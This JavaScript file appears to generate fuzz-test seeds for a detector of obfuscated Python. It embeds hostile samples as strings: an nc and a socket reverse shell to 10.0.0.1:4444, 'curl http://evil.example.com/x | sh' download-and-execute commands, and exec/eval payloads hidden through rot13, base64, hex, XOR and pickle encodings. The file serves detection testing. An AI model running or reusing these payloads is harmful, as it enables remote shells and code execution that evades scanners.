'use strict';
// ════════════════════════════════════════════════════════════════════════════
// grammars/python-grammar.js — deterministic seed generator for Python
// obfuscation (the python-obfuscation.js surface). Covers the 10
// TECHNIQUE strings emitted: exec/zlib, exec/marshal, codecs.decode,
// chr-join / bytes-list / chr-concat reassembly, builtin string-concat,
// subprocess / os.system / pty.spawn / socket reverse shell sinks.
// ════════════════════════════════════════════════════════════════════════════

const PYTHON_TECHNIQUE_CATALOG = Object.freeze([
  'Python exec(zlib.decompress(b64))',
  'Python exec(marshal.loads(b64))',
  "Python codecs.decode('rot_13')",
  "Python codecs.decode('rot13')",
  "Python codecs.decode('base64')",
  "Python codecs.decode('b64')",
  "Python codecs.decode('hex')",
  // NOTE: `codecs.decode('zlib')` is intentionally absent. The decoder
  // branch (python-obfuscation.js:340) requires `Decompressor.inflateSync`
  // from `src/decompressor.js`, which this target deliberately does NOT
  // load (see python-obfuscation.fuzz.js:12-16 — the "did we inflate?"
  // path is covered by unit tests and the interesting fuzz surface is
  // the pattern finder). Adding the row here would permanently show 0
  // hits and distort the hit-rate signal. If true zlib-codec coverage
  // becomes wanted, add `src/decompressor.js` to the target's modules
  // list and author a seed with a real zlib-deflated-base64 payload.
  'Python chr-join Reassembly',
  'Python bytes-list Reassembly',
  'Python chr-concat Reassembly',
  'Python Builtin String-Concat',
  'Python subprocess Sink',
  'Python os.system Sink',
  'Python pty.spawn Shell-Upgrade',
  'Python Socket Reverse-Shell',
  // ── Phase 3 additions ────────────────────────────────────────
  'Python pickle.loads(b64)',
  'Python lambda-wrapped exec',
  'Python lambda-wrapped eval',
  'Python lambda-wrapped compile',
  'Python Aliased exec',
  'Python Aliased eval',
  'Python Aliased compile',
  'Python bytes XOR List-Comp',
  'Python bytes.fromhex().decode()',
]);

function makeRng(seed) {
  let s = (seed | 0) || 0x70E17A00;
  return {
    next() { s ^= s << 13; s ^= s >>> 17; s ^= s << 5; return s >>> 0; },
    int(n) { return this.next() % Math.max(1, n); },
  };
}

function makeSeed(text, expectedSubstring) {
  const buf = Buffer.from(text, 'utf8');
  if (expectedSubstring) {
    Object.defineProperty(buf, '_expectedSubstring', {
      value: expectedSubstring,
      enumerable: false,
    });
  }
  return buf;
}

// Helper: base64 of a payload string (node Buffer).
function b64(s) { return Buffer.from(s, 'utf8').toString('base64'); }

// ── Branch generators ─────────────────────────────────────────────────────

function genExecZlib() {
  // exec(zlib.decompress(base64.b64decode(b'…')))
  // We don't need the zlib payload to actually decompress — the finder
  // recognises the pattern shape and the decoder attempts Decompressor.
  // A structurally-correct base64 of a zlib frame keeps the fuzz honest.
  const out = [];
  // Structure-only: the finder matches on the exec(zlib.decompress(b64decode(b'…')))
  // shape regardless of payload validity. The decoder emits a
  // preview of the INFLATED bytes (or, if inflation fails, of the
  // raw base64-decoded bytes). `b64('aGVsbG8=')` outer-decodes to
  // the ASCII string `aGVsbG8=`, which is not valid zlib → preview
  // = `aGVsbG8=`. `b64('x')` outer-decodes to `x` (one byte), not
  // valid zlib → preview = `x`.
  out.push(makeSeed(
    "import zlib, base64\nexec(zlib.decompress(base64.b64decode(b'" + b64('aGVsbG8=') + "')))",
    'aGVsbG8=',
  ));
  out.push(makeSeed(
    "exec(zlib.decompress(base64.b64decode('" + b64('x') + "')))",
    'x',
  ));
  return out;
}

function genExecMarshal() {
  return [
    // Decoder emits the b64-decoded marshal bytes as a utf-8 preview.
    // `cGF5bG9hZA==` decodes to `payload`.
    makeSeed(
      "import marshal, base64\nexec(marshal.loads(base64.b64decode(b'" + b64('payload') + "')))",
      'payload',
    ),
  ];
}

function genCodecsDecode() {
  // codecs.decode('…', 'rot_13') / 'base64' / 'hex' / 'zlib'
  //
  // The decoder's SENSITIVE_PY_KEYWORDS gate (python-obfuscation.js:44)
  // rejects decoded previews that lack exec/eval/os.system/subprocess/
  // socket/powershell/cmd.exe/…/bin/sh tokens — so every seed's
  // decoded substring MUST contain one of those names to fire a hit.
  const out = [];
  // rot_13('bf.flfgrz') == 'os.system'
  out.push(makeSeed(
    "import codecs\nexec(codecs.decode('bf.flfgrz', 'rot_13'))",
    'os.system',
  ));
  // rot13('rkrp') == 'exec' (same branch, underscore-free alias)
  out.push(makeSeed(
    "import codecs\ncodecs.decode('rkrp', 'rot13')",
    'exec',
  ));
  // base64('os.system') = 'b3Muc3lzdGVt'
  out.push(makeSeed(
    "import codecs\ny = codecs.decode('" + b64('os.system') + "', 'base64')",
    'os.system',
  ));
  // Same branch, shorthand alias `b64` (decoder normalises via the
  // `_codec$` regex + alias table; the emitted `technique` keeps the
  // raw spelling so `codecs.decode('b64')` is a distinct catalog row).
  out.push(makeSeed(
    "import codecs\ny2 = codecs.decode('" + b64('os.system') + "', 'b64')",
    'os.system',
  ));
  // hex('subprocess') = '73756270726f63657373'
  out.push(makeSeed(
    "import codecs\nz = codecs.decode('"
    + Buffer.from('subprocess').toString('hex')
    + "', 'hex')",
    'subprocess',
  ));
  return out;
}

function genChrJoin() {
  // ''.join(chr(x) for x in [...]) — decoded payload MUST satisfy
  // SENSITIVE_PY_KEYWORDS or the decoder drops it (line 394).
  // 'os.system' codepoints: [111,115,46,115,121,115,116,101,109]
  return [
    makeSeed(
      "payload = ''.join(chr(x) for x in [111,115,46,115,121,115,116,101,109])\nexec(payload)",
      'os.system',
    ),
    // list-comprehension form spelling 'subprocess'
    makeSeed(
      "cmd = ''.join([chr(i) for i in [115,117,98,112,114,111,99,101,115,115]])",
      'subprocess',
    ),
  ];
}

function genBytesList() {
  // bytes([...]).decode() — decoded payload must satisfy SENSITIVE
  // gate. 'os.system' codepoints.
  return [
    makeSeed(
      'exec(bytes([111,115,46,115,121,115,116,101,109]).decode())',
      'os.system',
    ),
    // 'socket' = [115,111,99,107,101,116]
    makeSeed(
      "payload = bytes([115,111,99,107,101,116]).decode('utf-8')",
      'socket',
    ),
  ];
}

function genChrConcat() {
  // chr(N)+chr(N)+… — must spell a SENSITIVE keyword.
  // 'exec' = 101,120,101,99
  return [
    makeSeed(
      'eval(chr(101)+chr(120)+chr(101)+chr(99))',
      'exec',
    ),
  ];
}

function genBuiltinConcat() {
  // getattr(__builtins__, 'e'+'val')('whoami')
  return [
    makeSeed(
      "getattr(__builtins__, 'e'+'val')('import os; os.system(\"whoami\")')",
      'eval',
    ),
    makeSeed(
      "getattr(__builtins__, 'ex'+'ec')(payload)",
      'exec',
    ),
  ];
}

function genSubprocessSink() {
  return [
    // Decoder emits the EXTRACTED argv (IP, command string) — not the
    // call name itself. `subprocess.Popen([...10.0.0.1...])` → IP
    // string in the decoded preview.
    makeSeed(
      "import subprocess\nsubprocess.Popen(['nc', '-e', '/bin/sh', '10.0.0.1', '4444'])",
      '10.0.0.1',
    ),
    makeSeed(
      "subprocess.check_output(['whoami'], shell=True)",
      'whoami',
    ),
  ];
}

function genOsSystemSink() {
  return [
    // Decoder emits the FULL command-string argument, not `os.system`
    // (the call name appears in the raw; the deobfuscated preview is
    // what was passed to it).
    makeSeed(
      "import os\nos.system('curl http://evil.example.com/x | sh')",
      'curl http://evil.example.com',
    ),
  ];
}

function genPtySpawn() {
  return [
    makeSeed(
      "import pty\npty.spawn('/bin/bash')",
      'pty.spawn',
    ),
  ];
}

function genSocketReverseShell() {
  return [
    makeSeed(
      "import socket,subprocess,os\n"
      + "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n"
      + "s.connect(('10.0.0.1',4444))\n"
      + "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)\n"
      + "subprocess.call(['/bin/sh','-i'])",
      'socket',
    ),
  ];
}

// ── Phase 3 generators ─────────────────────────────────────────

function _toBase64(str) {
  return Buffer.from(str, 'utf8').toString('base64');
}

function genPickleLoads() {
  // P7 — pickle.loads(base64.b64decode(...)). A genuine pickle stream
  // starts with 0x80 (PROTO opcode) for proto>=2 or `(` (MARK) for
  // proto 0/1. We emit a minimal PROTO-4 + NONE + STOP stream so the
  // P7 first-byte gate fires.
  const out = [];
  // Proto-4 PROTO header + NONE + STOP ("\x80\x04N.").
  const pickleBytes = Buffer.from([0x80, 0x04, 0x4e, 0x2e]);
  const b64 = pickleBytes.toString('base64');
  out.push(makeSeed(
    `import pickle,base64\nexec(pickle.loads(base64.b64decode('${b64}')))`,
    'pickle',
  ));
  // cPickle alias (Python 2 legacy path). The deobfuscated body is a
  // `<binary N (likely marshal/pickle): …>` summary — match on the
  // classifier label rather than the source-text alias. The alias
  // recognition itself is validated by the regex emitting a candidate
  // at all; an `empty-miss` would signal a regression.
  out.push(makeSeed(
    `import cPickle,base64\ncPickle.loads(base64.b64decode(b'${b64}'))`,
    'pickle',
  ));
  return out;
}

function genLambdaWrappedExec() {
  // P8a — (lambda s: exec(s))(payload) / (lambda: exec(payload))()
  const out = [];
  const b64 = _toBase64("import os; os.system('whoami')");
  out.push(makeSeed(
    `(lambda s: exec(s))(__import__('base64').b64decode('${b64}').decode())`,
    'exec',
  ));
  out.push(makeSeed(
    `(lambda: eval("__import__('os').system('id')"))()`,
    'eval',
  ));
  out.push(makeSeed(
    `(lambda _e: _e("print('pwned')"))(compile)`,
    'compile',
  ));
  return out;
}

function genAliasedExec() {
  // P8b — _e = exec; _e(payload)
  const out = [];
  out.push(makeSeed(
    `_x = exec\n_x("import os; os.system('curl http://evil.example/p|sh')")`,
    'exec',
  ));
  out.push(makeSeed(
    `e_ = eval; e_("__import__('os').system('id')")`,
    'eval',
  ));
  // Aliased `compile` — same shape as exec/eval; covers the third
  // DANGEROUS_BUILTINS branch. `compile(src, '<anon>', 'exec')` is the
  // RCE primitive when paired with a later `exec(bytecode)` call.
  out.push(makeSeed(
    `c_ = compile\nc_("__import__('os').system('id')", '<anon>', 'exec')`,
    'compile',
  ));
  // Alias name that matches a dangerous builtin → MUST be suppressed
  // (decoder rejects DANGEROUS_BUILTINS.has(alias)).
  out.push(makeSeed(
    `getattr = exec\nfoo = 1`,
    '',
  ));
  return out;
}

function genBytesXorListComp() {
  // P9 — bytes([b ^ 0x42 for b in b'...'])
  // Python-specific SENSITIVE gate (python-obfuscation.js) does NOT
  // include shell-LOLBin vocab like curl/wget — that's bash/cmd
  // territory. Encode a Python-native sink so the decode passes
  // the post-decode keyword gate.
  const plaintext = 'os.system("id")';
  const key = 0x42;
  let hex = '';
  for (let i = 0; i < plaintext.length; i++) {
    hex += '\\x' + (plaintext.charCodeAt(i) ^ key).toString(16).padStart(2, '0');
  }
  const out = [];
  out.push(makeSeed(
    `bytes([b ^ 0x42 for b in b'${hex}'])`,
    'os.system',
  ));
  // bytearray generator form with decimal key.
  const plain2 = 'subprocess.call';
  let hex2 = '';
  for (let i = 0; i < plain2.length; i++) {
    hex2 += '\\x' + (plain2.charCodeAt(i) ^ 66).toString(16).padStart(2, '0');
  }
  out.push(makeSeed(
    `bytearray(c ^ 66 for c in b'${hex2}')`,
    'subprocess',
  ));
  return out;
}

function genBytesFromHex() {
  // P10 — exec(bytes.fromhex('…').decode())
  const out = [];
  const payload = "import os; os.system('whoami')";
  const hex = Buffer.from(payload, 'utf8').toString('hex');
  out.push(makeSeed(
    `exec(bytes.fromhex('${hex}').decode())`,
    'os.system',
  ));
  const payload2 = "subprocess.call(['curl','http://x'])";
  const hex2 = Buffer.from(payload2, 'utf8').toString('hex');
  out.push(makeSeed(
    `eval(bytearray.fromhex('${hex2}').decode('utf-8'))`,
    'subprocess',
  ));
  return out;
}

function generatePythonSeeds() {
  const rng = makeRng(0x70E17A00);
  void rng;
  return [
    ...genExecZlib(),
    ...genExecMarshal(),
    ...genCodecsDecode(),
    ...genChrJoin(),
    ...genBytesList(),
    ...genChrConcat(),
    ...genBuiltinConcat(),
    ...genSubprocessSink(),
    ...genOsSystemSink(),
    ...genPtySpawn(),
    ...genSocketReverseShell(),
    ...genPickleLoads(),
    ...genLambdaWrappedExec(),
    ...genAliasedExec(),
    ...genBytesXorListComp(),
    ...genBytesFromHex(),
  ];
}

module.exports = { generatePythonSeeds, PYTHON_TECHNIQUE_CATALOG };
